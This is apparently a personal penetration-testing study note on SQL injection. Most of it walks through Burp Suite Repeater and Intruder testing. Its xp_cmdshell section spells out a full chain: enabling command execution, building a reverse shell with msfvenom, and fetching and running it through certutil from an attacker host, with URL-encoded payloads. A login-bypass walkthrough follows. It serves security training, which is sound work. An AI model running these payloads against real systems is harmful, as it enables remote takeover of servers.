# SQL Injections

## Follow this video:
https://www.youtube.com/watch?v=JkJLZ4NYISQ

## Testing for it:

```
?id=
?page=
?product=
?user=
search=
login forms
```
## Steps with Burp Suite
### Step One

Open Burp Suite

Go to Proxy → Intercept

Ensure Intercept is ON

Configure your browser proxy:
```
127.0.0.1
port 8080
```
### Step Two

Capture a Request

Navigate to the target application in your browser.

```
http://target/products.php?id=10
```
Burp will intercept the request like so:

```
GET /products.php?id=10 HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
```

### Step Three
Once you capture a request you want to analyze:

Right-click the request

Select Send to Repeater

Repeater allows you to manually modify and resend requests.

### Step Four

Inside Repeater, focus on user-controlled inputs.

Common parameters to examine:

```
?id=
?user=
?search=
?page=
POST form data
cookies
```

Change the value and send the request repeatedly to observe:

response differences

error messages

status codes

response sizes

### Step Five

When testing a parameter, watch for differences such as:

Indicator	What it may suggest
database errors	backend query issue
different response size	different query result
page behavior change	logic flaw
unexpected authentication	input affecting query

Burp Repeater helps you compare responses quickly.

Step Six:
If you want to test many payload variations automatically:

Right-click request

Send to Intruder

Steps:

Select the parameter to test

Set payload position

Choose payload list

Start attack

Intruder sends multiple requests with different inputs.

You then analyze:
```
response length
status codes
error messages
```
Don't forget to check:
```
Cookie values
Authorization headers
User-Agent
custom headers
```
### xm_cmd way with burp:
### Step One: Id the site

```
http://target/app.php?id=1
```
Send this to the repeater. 

### Step Two:
Enable xp_cmdshell

xp_cmdshell is often disabled by default in SQL Server for security reasons.

So the first step is enabling it through SQL configuration.

Conceptually, the SQL commands being executed are:
```
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
```
EXEC%20sp_configure%20%27xp_cmdshell%27%2C1%3B%20RECONFIGURE%3B
```
### Step Three
You may have to URL-encode it:
```
EXEC xp_cmdshell 'whoami'
```
encoded
```
EXEC%20xp_cmdshell%20%27whoami%27
```
Full payload:
```
**http://target/app.php?id=;EXEC%20xp_cmdshell%20%27whoami%27--
```

### Step Four
Prep for the payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=80 -f exe -o r80.exe
```
Open listener:

```
rlwrap nc -lnvp 80
```

### Step Five
Send that payload over:
```
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<IP>:80/r80.exe C:\Windows\Temp\r80.exe'
```
Encoded:
```
EXEC%20xp_cmdshell%20%27certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F<ip>%3A80%2Fr80.exe%20C%3A%5CWindows%5CTemp%5Cr80.exe%27****
```
### Step Six
Run it
```
EXEC xp_cmdshell 'C:\Windows\Temp\r80.exe'
```
Encoded
```
EXEC%20xp_cmdshell%20%27C%3A%5CWindows%5CTemp%5Cr80.exe%27
```
## SQL Injection with Intruder for Login Authtication
Starting with the link as an example
<img width="1508" height="576" alt="image" src="https://github.com/user-attachments/assets/a17f11ff-3d23-45f8-9d1e-b53c6f01f645" />

Check the error:

<img width="849" height="174" alt="image" src="https://github.com/user-attachments/assets/34a7667f-aff9-4d50-bb03-348b16411637" />

Next,  redo the connection and send it to the intruder, and under the username select it the user and then click on add:

<img width="1895" height="523" alt="image" src="https://github.com/user-attachments/assets/6854586e-e8e7-4fc1-8fcc-164d8670cf39" />

Next, add payload with the load option to the side, then click text file:

<img width="792" height="596" alt="image" src="https://github.com/user-attachments/assets/03f07db8-ce77-4d3b-b80b-cf320a8624ce" />

Next, start the payload; keep snipper; with SQL injection, you don't need a password; click start attack. A new window will pop up and check the response:

<img width="1474" height="401" alt="image" src="https://github.com/user-attachments/assets/9db83af5-0ce9-498b-9fa2-f7e02aea3a48" />

It worked:
<img width="1487" height="817" alt="image" src="https://github.com/user-attachments/assets/77d81ddd-294c-4306-aa8b-d279e43c5f1b" />


Now, back to the proxy tab and turn off the interceptor, or send it into the response and try logging in in Burp; you should log in. But code 301 means it was successful. 

## Great tools:
https://github.com/squid22/PostgreSQL_RCE --> PostgreSQL RCE is already there, just change the ip address and port

https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet


## Links
My Blog post on the subject:

https://medium.com/@aaronashley466/ospc-notes-sql-injection-cheatsheet-0788f4624702
